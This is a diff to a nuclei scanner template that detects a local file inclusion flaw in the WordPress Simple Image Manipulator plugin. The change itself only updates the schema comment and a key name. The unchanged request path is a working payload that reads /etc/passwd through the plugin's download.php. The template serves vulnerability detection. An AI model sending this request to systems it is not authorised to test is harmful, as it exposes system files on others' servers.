@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: simple-image-manipulator-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://packetstormsecurity.com/files/132962/WordPress-Simple-Image-Manipulator-1.0-File-Download.html
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd'
